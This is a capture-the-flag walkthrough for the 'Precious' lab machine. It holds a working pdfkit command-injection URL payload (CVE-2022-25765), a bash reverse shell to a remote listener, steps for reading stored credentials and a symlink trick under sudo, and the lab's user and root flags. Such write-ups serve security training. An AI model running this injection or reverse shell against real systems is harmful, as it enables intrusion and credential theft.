# Precious - Easy

```shell
sudo vim /etc/hosts
#map ip to precious.htb

nmap -T4 -p- -A -v precious.htb

feroxbuster -u http://precious.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent

#for the exploit payload
sudo python3 -m http.server 80

#setup listener
nc -nvlp 4444
#we get reverse shell on listener

whoami
#ruby

python3 -c 'import pty;pty.spawn("/bin/bash")'

#check common directories for clues
ls -la /opt

ls -la /var/www

ls -la /home

ls -la /home/ruby

ls -la /home/ruby/.bundle

cat /home/ruby/.bundle/config
#this contains creds for 'henry'
#we can attempt to use it for ssh login

ssh henry@10.129.98.205

#get user flag

sudo -l
#we can run a ruby file as sudo

ls -la /opt

cat /opt/update_dependencies.rb
#this program reads dependencies.yml
#but there is no such file in /opt

find / -name 'dependencies.yml' 2>/dev/null
#there is a file in /opt/sample
#but we do not have write permissions in /opt

sudo /usr/bin/ruby /opt/update_dependencies.rb
#gives error
#there is no dependencies.yml

#we can create a symbolic link named dependencies.yml
#that points to root flag
#to misuse the Ruby program as it did not mention full path

ln -s /root/root.txt dependencies.yml

sudo /usr/bin/ruby /opt/update_dependencies.rb
#this gives error
#but error message contains root flag
```

* Open ports & services:

  * 22 - ssh - OpenSSH 8.4p1 (Debian)
  * 80 - http - nginx 1.18.0

* We can explore the webpage - it offers conversion from webpage to PDF, and we can provide URL as input.

* We can enumerate the webpage for any hidden directories using ```feroxbuster``` but we do not get anything.

* We can also observe that the webpage is only able to fetch URL and convert to PDF, if the URL starts with ```http://```.

* We can intercept and capture the request using ```Burp Suite```, and forward it to Repeater.

* When we send an URL that starts with ```http://```, it attempts to convert it to a PDF - the result is a blank PDF.

* However, in the Response, we can see some details - the webpage is using ```pdfkit v0.8.6```.

* When we search for any exploits related to this version of ```pdfkit```, we get results for CVE-2022-25765.

* This vulnerability covers command injection in ```pdfkit``` versions before 0.8.7, so the webpage is vulnerable.

* Following the format of the example given to us in the exploit, we can frame our input payload:

```http://example.com/?name=#{'%20`sleep 5`'}```

* However, this does not work and we get the message "Cannot load remote URL".

* We can try to host a server using ```http.server``` from attacker machine, and use that as a part of payload.:

```http://10.10.14.13/?name=#{'%20`sleep 5`'}```

* This does convert the page to a PDF - but we are unable to execute the command.

* We can try other commands, such as reverse-shell commands; we need to setup a listener before executing the payload:

```http://10.10.14.13/?name=#{'%20`bash -c "sh -i >& /dev/tcp/10.10.14.13/4444 0>&1"`'}```

* This payload gives us a reverse shell on our listener.

* We have shell access as 'ruby' user - we can start basic enumeration before using ```linpeas.sh```

* We can start by checking common directories such as /opt, /var/www, /home

* We have a home directory at /home/ruby - this contains a hidden folder, which contains a file inside.

* This file includes creds for the user 'henry' - we can attempt to use this for SSH login.

* Logging into SSH as henry using these creds works, and we can get the user flag now.

* Now, ```sudo -l``` shows that we can execute a particular ruby file as sudo without password:

```(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb```

* Printing 'update_dependencies.rb' shows that it reads from a file 'dependencies.yml', and updates it.

* Now, the .rb program does not mention the full path for the '.yml' file; furthermore, there is no '.yml' file of the same name in /opt

* There is one file with the same name in /opt/sample, but we cannot modify or copy it somewhere.

* Knowing that we do not have any write permissions in /opt, we will have to find a workaround.

* Running the sudo command as it is fails to execute since there is no 'dependencies.yml' in the given file location.

* As the full path is not given for the '.yml' file in the Ruby program, we can misuse it by creating a symbolic link with the name of the '.yml' file, that points to the root flag.

* Now, if we run the sudo command, the Ruby program does not execute properly, and the error message contains the root flag.

```markdown
1. User flag - ecd1608ee4e8db899b61422f8c803d2c

2. Root flag - b646d6e93e01a523d09bf6e11fe0422a
```
